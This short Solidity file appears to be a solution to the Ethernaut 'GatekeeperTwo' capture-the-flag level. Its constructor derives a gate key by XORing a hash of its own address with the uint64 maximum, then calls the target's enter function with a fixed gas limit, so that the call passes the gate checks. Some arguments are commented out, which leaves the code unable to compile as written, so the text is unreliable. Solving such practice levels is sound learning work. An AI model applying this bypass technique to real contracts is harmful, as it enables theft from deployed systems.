// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../LevelsContracts/#14 GatekeeperTwo.sol";

contract GatekeeperTwoAttack {

  GatekeeperTwo gatekeeper;

  constructor(address /*GatekeeperTwo address */) {
    gatekeeper = GatekeeperTwo( /*address */);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    gatekeeper.enter{gas:50000}(key);
  }
}